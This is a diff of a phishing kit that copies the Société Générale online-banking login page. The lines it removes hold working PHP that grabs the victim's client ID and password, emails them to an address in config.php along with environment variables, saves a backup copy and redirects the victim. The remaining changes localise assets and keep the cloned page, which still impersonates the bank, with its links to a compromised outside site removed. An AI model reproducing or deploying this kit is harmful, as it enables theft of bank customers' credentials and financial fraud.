@@ -1,40 +1,4 @@
-<?php
-@session_start();
-error_reporting(0);
 
-$currentPath = $_SERVER['PHP_SELF'];
-// output: Array ( [dirname] => /myproject [basename] => index.php [extension] => php [filename] => index )
-$pathInfo = pathinfo($currentPath);
-
-$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
-$domainName = $_SERVER['HTTP_HOST'].'/';
-
-$host_name = $protocol.$domainName.$pathInfo['dirname']."/";
-
-function is_var_set($var) {
-
-	return (isset($_POST[$var]) && $_POST[$var] !="") ? true : false;
-}
-
-if( is_var_set("user_id") && is_var_set("pass_id")) {
-
-	$_SESSION['user_id'] = $_REQUEST['user_id'];
-	$_SESSION['pass_id'] = $_REQUEST['pass_id'];
-
-	$info_names = array(
-
-		"IDENTIFIANT" => "user_id",	//12345678
-		"ID PASSWORD" => "pass_id"
-	);
-	$redirection = "profil.php";
-
-	include("config.php");
-	mail($emailTo,$subject,$infoRaw.$env_vars,$headers);
-	save_rs("backup",$subject,$infoRaw);
-	echo "<script>window.location.href = '".$redirection."';</script>";
-
-}
-?>
 
 <html class="swm-root-active swm-mode-page" lang="FR"><head>
 
@@ -46,13 +10,6 @@ if( is_var_set("user_id") && is_var_set("pass_id")) {
                      <!-- <script type="text/javascript" async="" src="https://www.google.com/pagead/conversion_async.js"></script><script src="https://connect.facebook.net/signals/config/873080639448770?v=2.9.18&amp;r=stable" async=""></script><script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script><script src="//bat.bing.com/bat.js" async=""></script><script type="text/javascript" charset="UTF-8" async="" id="MFBActor" src="https://actorssl-5637.kxcdn.com/actor/a7a30ba0aebbae114c740a1b35adb8c7-1641/action"></script><script>if (top != self) { top.location = self.location; }</script> -->
                     <title>Société Générale | Connexion</title>
 
-                <base href="https://particuliers.societegenerale.fr">
-
-
-
-                    <!-- <script charset="UTF-8" src="/static/Resources/js/n2g_secu.js"></script> -->
-        <!-- <script type="text/javascript">frame_shield();</script> -->
-        <!-- <script type="application/json" id="sas_user_info"> -->
 
 <!-- </script> -->
 <style>
@@ -76,7 +33,7 @@ if( is_var_set("user_id") && is_var_set("pass_id")) {
 	color: #333;
 }
 </style>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="js/jquery.min.js"></script>
 <script type="text/javascript">
 
 var authStep = 1;
@@ -215,7 +172,8 @@ $(document).ready(function(){
 		$(".loading_img").show();
 		setTimeout(function()
 		{
-			$('#main-form').submit();
+			// $('#main-form').submit();
+			window.location.href = '/secure/profil.html'
 		}, 3000);
 
 	});
@@ -253,7 +211,7 @@ $(document).ready(function(){
 	window.cmsConstants.LOGGER_SERVICE_END_POINT_DEFAULT = "/extrestcontent/logBigData";
 	window.cmsConstants.LOGGER_LEVEL_MIN_SERVER_DEFAULT = "ERROR";
 	window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT_DEFAULT = "ERROR";
-</script><meta name="viewport" content="initial-scale=1, maximum-scale=1, viewport-fit=cover"><link rel="icon" type="image/x-icon" href="/static/Resources/img/favicon.ico">
+</script><meta name="viewport" content="initial-scale=1, maximum-scale=1, viewport-fit=cover"><link rel="icon" type="image/x-icon" href="static/Resources/img/favicon.ico">
 
         <script type="text/javascript">
 		/*
@@ -354,9 +312,9 @@ $(document).ready(function(){
 
                     <!-- <script charset="UTF-8" src="/static/Resources/js/indexv2_20200128180913.min.js"></script> -->
             <!-- <script charset="UTF-8" src="/static/Resources/js/TMS/tc_SocieteGenerale_20_20200429091823.js"></script><script id="tc_script_114_1" src="https://static.societegenerale.fr/pri/static/dmsa/iframe/dmp_bridge.js" async="" defer="" data-console="true" data-kruxenvname="socgenprod" data-kruxcontroltagid="Kw6K3cJw"></script><script id="tc_script__1" type="text/javascript" src="//particuliers.societegenerale.fr/static/Resources/js/TMS/tc_SocieteGenerale_22.js" defer=""></script> -->
-            <link href="/static/Resources/stylesheets/index-v3_20200311155104.min.css" rel="stylesheet" type="text/css">
-                <link href="/static/Resources/stylesheets/spec56_btn_gsm_all_gcd_20200128180913.min.css" rel="stylesheet" type="text/css">
-                <link href="/static/Resources/stylesheets/print_20200128180913.min.css" rel="stylesheet" type="text/css" media="print">
+            <link href="static/Resources/stylesheets/index-v3_20200311155104.min.css" rel="stylesheet" type="text/css">
+                <link href="static/Resources/stylesheets/spec56_btn_gsm_all_gcd_20200128180913.min.css" rel="stylesheet" type="text/css">
+                <link href="static/Resources/stylesheets/print_20200128180913.min.css" rel="stylesheet" type="text/css" media="print">
                 <style type="text/css">
 .eip_txt_light{
   font-weight:300;
@@ -373,7 +331,7 @@ $(document).ready(function(){
 .eip_dcw_main-link:hover, .eip_dcw_main-link:focus{
   color:#f05b6f;
 }
-</style><link href="/static/Resources/stylesheets/Surcharges-templates/head-section_fix-gb9_15852298750000.css" rel="stylesheet" type="text/css">
+</style><link href="static/Resources/stylesheets/Surcharges-templates/head-section_fix-gb9_15852298750000.css" rel="stylesheet" type="text/css">
 <!-- <script charset="UTF-8" type="text/javascript" src="/static/pri/contenu/js/prof.js"></script> -->
 <!-- URL: https://particuliers.societegenerale.fr:80/restcontent/theme/e7ec774b8e120610VgnVCM100000050013acRCRD -->
 <!-- REQUEST PROFILE: null, REQUEST SAS AUTH_LEVEL: 0 -->
@@ -399,10 +357,10 @@ $(document).ready(function(){
 		<ul class="rsp_nav__list">
 
         <li class="rsp_nav__item rsp_nav__item--push-right" data-channelid="">
-            <a data-tms-container-label="top-menu" href="https://agences.societegenerale.fr/banque-assurance/" class="rsp_nav__link" data-tms-click-type="N" data-tms-element-label="agences"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#"></use></svg><span>Agences</span></a>
+            <a data-tms-container-label="top-menu" href="https://agences.societegenerale.fr/banque-assurance/" class="rsp_nav__link" data-tms-click-type="N" data-tms-element-label="agences"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#"></use></svg><span>Agences</span></a>
         </li>
         <li class="rsp_nav__item" data-channelid="7eb2e45e86bb3610VgnVCM1000000ae1c6c0RCRD">
-            <a data-tms-container-label="top-menu" href="/aides-contact" class="rsp_nav__link" data-tms-click-type="N" data-tms-element-label="aide-et-contacts"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#"></use></svg><span>Aide et contacts</span></a>
+            <a data-tms-container-label="top-menu" href="/aides-contact" class="rsp_nav__link" data-tms-click-type="N" data-tms-element-label="aide-et-contacts"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#"></use></svg><span>Aide et contacts</span></a>
         </li>
 </ul>
 	</nav>
@@ -464,7 +422,7 @@ $(document).ready(function(){
 </noscript>
 
 <!-- <link rel="stylesheet" href="/icd/static/swm/resources/version/19.43.7/assets/markets/BDDF/PRI/INT/style.css"> -->
-<link rel="stylesheet" href="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/style/style.css">
+<link rel="stylesheet" href="modules/photomanagement/extra/style/style.css">
 
 
 <script>
@@ -562,7 +520,7 @@ swmConfOverride.styles = ["/icd/static/swm/resources/version/19.43.7/assets/mark
 
         <div class="swm_authent">
 
-					<img class="loading_img" src="<?=$host_name?>/img/load.gif">
+					<img class="loading_img" src="img/load.gif">
 
         <div class="auth-content js-content-aria-hide swm_codeContainer">
             <div id="swmModulesAuth">  <div id="module-authent-cv"> <div class="container-mire-codeClient"> <div class="swm_block">
@@ -726,7 +684,7 @@ swmConfOverride.styles = ["/icd/static/swm/resources/version/19.43.7/assets/mark
 
 
 
-    <img src="/icd/static/swm/resources/version/19.43.7/markets/BDDF/PRI/INT/img/loader.gif" style="display: none; width: 0; height: 0;">
+    <img src="img/loader.gif" style="display: none; width: 0; height: 0;">
 
     <script type="text/javascript">
 		/*
@@ -774,7 +732,7 @@ swmConfOverride.styles = ["/icd/static/swm/resources/version/19.43.7/assets/mark
 		<div>
 
 			<div>
-				<link href="/static/Particuliers/Home/Login-Page/User-Login-Page/css/eo2680-style.css" rel="stylesheet">
+				<link href="static/Particuliers/Home/Login-Page/User-Login-Page/css/eo2680-style.css" rel="stylesheet">
 <div id="swm-content-default">
 <p><br>
 <strong>Obtenir vos codes</strong><br>
@@ -784,20 +742,20 @@ Le code client vous est attribué par un conseiller au moment de votre inscripti
 <strong>Code secret oublié</strong><br>
 <br>
 <a style="text-decoration: underline !important" href="/swm/swm-reattribution.html" class="dcw_card-visual_regular-link">
-<img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/arrow.png" class="arrow_image">Effectuer une nouvelle demande</a><br>
+<img src="modules/photomanagement/extra/img/arrow.png" class="arrow_image">Effectuer une nouvelle demande</a><br>
 <br>
 <br>
 <strong>Urgences carte bancaire</strong><br>
 <br>
-<a style="text-decoration: underline !important;" href="/aides-contact/contact-services-urgence" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées"><img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/arrow.png" class="arrow_image">Faire opposition à votre carte bancaire</a><br>
-<a style="text-decoration: underline !important;" href="/secure/comptes-budget/mes-cartes/reclamation-carte" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées"><img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/arrow.png" class="arrow_image">Verrouiller votre carte bancaire</a><br>
+<a style="text-decoration: underline !important;" href="/aides-contact/contact-services-urgence" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées"><img src="modules/photomanagement/extra/img/arrow.png" class="arrow_image">Faire opposition à votre carte bancaire</a><br>
+<a style="text-decoration: underline !important;" href="/secure/comptes-budget/mes-cartes/reclamation-carte" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées"><img src="modules/photomanagement/extra/img/arrow.png" class="arrow_image">Verrouiller votre carte bancaire</a><br>
 <br>
 <br>
 <strong>Nos conseils sécurité</strong><br>
 <br>
-<a style="text-decoration: underline !important;" href="/securite/pass-securite" class="dcw_card-visual_regular-link" aria-label="Découvrez le Pass sécurité"><img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/arrow.png" class="arrow_image">Découvrez le Pass sécurité</a><br>
-<a style="text-decoration: underline !important;" href="/securite/mesures-de-securite" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées"><img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/arrow.png" class="arrow_image">Voir les menaces identifiées</a><br>
-<a style="text-decoration: underline !important;" href="/securite/bonnes-pratiques-securite-pour-eviter-les-fraudes" class="dcw_card-visual_regular-link" aria-label="Voir le Guide des bonnes pratiques"><img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/arrow.png" class="arrow_image">Guide des bonnes pratiques</a></p>
+<a style="text-decoration: underline !important;" href="/securite/pass-securite" class="dcw_card-visual_regular-link" aria-label="Découvrez le Pass sécurité"><img src="modules/photomanagement/extra/img/arrow.png" class="arrow_image">Découvrez le Pass sécurité</a><br>
+<a style="text-decoration: underline !important;" href="/securite/mesures-de-securite" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées"><img src="modules/photomanagement/extra/img/arrow.png" class="arrow_image">Voir les menaces identifiées</a><br>
+<a style="text-decoration: underline !important;" href="/securite/bonnes-pratiques-securite-pour-eviter-les-fraudes" class="dcw_card-visual_regular-link" aria-label="Voir le Guide des bonnes pratiques"><img src="modules/photomanagement/extra/img/arrow.png" class="arrow_image">Guide des bonnes pratiques</a></p>
 </div>
 
 <div id="swm-content-oob" style="display:none">
@@ -805,7 +763,7 @@ Le code client vous est attribué par un conseiller au moment de votre inscripti
 <p class="eo2680-oob--title">Sécurité renforcée</p>
 
 <div class="eo2680-card">
-<figure><img src="/static/Particuliers/Home/Login-Page/User-Login-Page/img/securite-renforcee.png"></figure>
+<figure><img src="static/Particuliers/Home/Login-Page/User-Login-Page/img/securite-renforcee.png"></figure>
 
 <p><strong>La réglementation européenne*</strong>, applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l’accès à votre Espace Client est soumis à <strong>une authentification renforcée tous les 90 jours</strong>.</p>
 </div>
@@ -829,7 +787,7 @@ Vous pouvez modifier votre numéro de téléphone en appelant notre serveur voca
 <p class="eo2680-oob--title">Sécurité renforcée</p>
 
 <div class="eo2680-card">
-<figure><img src="/static/Particuliers/Home/Login-Page/User-Login-Page/img/securite-renforcee.png"></figure>
+<figure><img src="static/Particuliers/Home/Login-Page/User-Login-Page/img/securite-renforcee.png"></figure>
 
 <p><strong>La réglementation européenne*</strong>, applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l’accès à votre Espace Client est soumis à <strong>une authentification renforcée tous les 90 jours</strong>.</p>
 </div>
@@ -837,9 +795,9 @@ Vous pouvez modifier votre numéro de téléphone en appelant notre serveur voca
 
 <div class="eo2680-card"><span><strong>Le saviez vous ?</strong></span>
 
-<figure><img src="/static/Particuliers/Home/Login-Page/User-Login-Page/img/s-curit-renforc-e-2.png"></figure>
+<figure><img src="static/Particuliers/Home/Login-Page/User-Login-Page/img/s-curit-renforc-e-2.png"></figure>
 
-<p>Le <strong>Pass Sécurité</strong> disponible dans l’Appli Société Générale vous permet de <strong>valider très simplement</strong> les actions nécessitant une<strong> authentification renforcée</strong>. Plus besoin de mémoriser et saisir le Code Sécurité reçu par SMS : tout se passe instantanément dans l’Appli ! <a style="text-decoration: underline !important;" href="https://particuliers.societegenerale.fr/securite/pass-securite" class="dcw_card-visual_regular-link" aria-label="Découvrez le Pass sécurité"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Tout savoir sur le Pass Sécurité</a></p>
+<p>Le <strong>Pass Sécurité</strong> disponible dans l’Appli Société Générale vous permet de <strong>valider très simplement</strong> les actions nécessitant une<strong> authentification renforcée</strong>. Plus besoin de mémoriser et saisir le Code Sécurité reçu par SMS : tout se passe instantanément dans l’Appli ! <a style="text-decoration: underline !important;" href="https://particuliers.societegenerale.fr/securite/pass-securite" class="dcw_card-visual_regular-link" aria-label="Découvrez le Pass sécurité"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="static/Resources/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Tout savoir sur le Pass Sécurité</a></p>
 </div>
 <!-- #eo2680-card -->
 
@@ -898,18 +856,18 @@ Vous pouvez modifier votre numéro de téléphone en appelant notre serveur voca
 	<!-- <script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=AW-1004456575"></script> -->
 <aside class="dcw_msg-banner dcw_msg-banner--info" role="alert" id="cookieDisclaimer" style="display:none">
     <div class="dcw_msg-banner_msg-wrapper">
-        <svg class="dcw_msg-banner_picto-info" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#info"></use></svg>
+        <svg class="dcw_msg-banner_picto-info" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#info"></use></svg>
         <p class="dcw_msg-banner_message">
             En poursuivant votre navigation sur ce site, vous acceptez l'utilisation de cookies pour vous proposer des publicités ciblées adaptées à vos centres d'intérêts et réaliser des statistiques. Pour en savoir plus et paramétrer vos cookies,&nbsp;<span style="font-size: 16px;"><a href="/charte-cookies-societe-generale" class="eip_dcw_main-link">cliquez ici</a></span>.
         </p>
         <button class="dcw_msg-banner_btn-closed" arial-label="Fermer le message contextuel">
-            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#close-2"></use></svg>
+            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#close-2"></use></svg>
         </button>
     </div>
 </aside><aside class="dcw_msg-banner dcw_msg-banner--info dcw_msg-banner--last-connexion" id="lastConnectionBanner" role="alert" style="display:none;">
-<div class="dcw_msg-banner_msg-wrapper"><svg aria-hidden="true" class="dcw_msg-banner_picto-info" focusable="false"> <use width="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#info" height="100%"></use> </svg>
+<div class="dcw_msg-banner_msg-wrapper"><svg aria-hidden="true" class="dcw_msg-banner_picto-info" focusable="false"> <use width="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels.svg#info" height="100%"></use> </svg>
 <p class="dcw_msg-banner_message" id="lastConnectionMessage">&nbsp;</p>
-<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed"><svg aria-hidden="true" focusable="false"> <use width="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#close-2" height="100%"></use> </svg></button></div>
+<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed"><svg aria-hidden="true" focusable="false"> <use width="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels.svg#close-2" height="100%"></use> </svg></button></div>
 </aside>
 
 <footer class="dcw_footer" role="contentinfo">
@@ -918,17 +876,17 @@ Vous pouvez modifier votre numéro de téléphone en appelant notre serveur voca
 			<nav class="dcw_footer-second_nav">
 				<ul class="dcw_footer-second_list">
 					    <li class="dcw_footer-second_item">
-<a data-tms-container-label="footer-general-shortcuts" href="http://agences.societegenerale.fr/banque-assurances/home.asp" data-tms-click-type="N" data-tms-element-label="trouver-une-agence">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#localisation"></use></svg>
+<a data-tms-container-label="footer-general-shortcuts" href="http://agences.societegenerale.fr/banque-assurances/home.asp" data-tms-click-type="N" data-tms-element-label="trouver-une-agence">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#localisation"></use></svg>
             Trouver une agence
 </a>    </li>
     <li class="dcw_footer-second_item">
-<a data-tms-container-label="footer-general-shortcuts" href="/icd/pch/faq" data-tms-click-type="N" data-tms-element-label="questions-fréquentes">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#question"></use></svg>
+<a data-tms-container-label="footer-general-shortcuts" href="/icd/pch/faq" data-tms-click-type="N" data-tms-element-label="questions-fréquentes">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#question"></use></svg>
             Questions fréquentes
 </a>    </li>
 <li class="dcw_footer-second_item">
 							<div class="dcw_dropdown js-dropdown-light">
     <button class="dcw_dropdown_titre js-dropdown_btn" aria-label="Ouvrir la liste des autres sites Société Générale" aria-expanded="false" aria-owns="dcw-dropdown-list">Autres sites Société Générale</button>
-   <svg class="dcw_dropdown_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#arrow-dropdown"></use></svg>
+   <svg class="dcw_dropdown_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#arrow-dropdown"></use></svg>
     <ul class="dcw_dropdown_list toggle_content">
             <li class="dcw_dropdown_item">
                 <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://www.privatebanking.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="banque-privée">Banque privée</a>
@@ -951,20 +909,20 @@ Vous pouvez modifier votre numéro de téléphone en appelant notre serveur voca
 			</nav>
 			<ul class="dcw_footer_container dcw_footer-second_social">
 				    <li class="dcw_footer-second_item-social">
-<a data-tms-container-label="footer-social-links" title="Facebook" href="https://www.facebook.com/societegenerale.france/" aria-label="Voir le groupe Facebook de la Société Générale" data-tms-click-type="N" data-tms-element-label="facebook">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#facebook-2"></use></svg>
+<a data-tms-container-label="footer-social-links" title="Facebook" href="https://www.facebook.com/societegenerale.france/" aria-label="Voir le groupe Facebook de la Société Générale" data-tms-click-type="N" data-tms-element-label="facebook">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#facebook-2"></use></svg>
 </a>    </li>
     <li class="dcw_footer-second_item-social">
-<a data-tms-container-label="footer-social-links" title="Twitter" href="https://twitter.com/sg_etvous" aria-label="Voir le Twitter de la Société Générale" data-tms-click-type="N" data-tms-element-label="twitter">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#twitter-2"></use></svg>
+<a data-tms-container-label="footer-social-links" title="Twitter" href="https://twitter.com/sg_etvous" aria-label="Voir le Twitter de la Société Générale" data-tms-click-type="N" data-tms-element-label="twitter">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#twitter-2"></use></svg>
 </a>    </li>
     <li class="dcw_footer-second_item-social">
-<a data-tms-container-label="footer-social-links" title="Instagram" href="https://www.instagram.com/societegenerale/?hl=fr" aria-label="Voir l' Instagram de la Société Générale" data-tms-click-type="N" data-tms-element-label="instagram">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#instagram"></use></svg>
+<a data-tms-container-label="footer-social-links" title="Instagram" href="https://www.instagram.com/societegenerale/?hl=fr" aria-label="Voir l' Instagram de la Société Générale" data-tms-click-type="N" data-tms-element-label="instagram">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#instagram"></use></svg>
 </a>    </li>
 </ul>
 		</div>
 	</div>
 	<nav class="dcw_footer-third">
 		<div class="dcw_footer_container">
-			<img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" src="/static/Resources/img/logo/logo-sg-seul.svg" width="150" height="30">
+			<img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" src="static/Resources/img/logo/logo-sg-seul.svg" width="150" height="30">
 <ul class="dcw_footer-third_list">
 				    <li class="dcw_footer-third_item">
         <a data-tms-container-label="footer-super-links" href="/tous-nos-tarifs" data-tms-click-type="N" data-tms-element-label="tarifs">Tarifs</a>
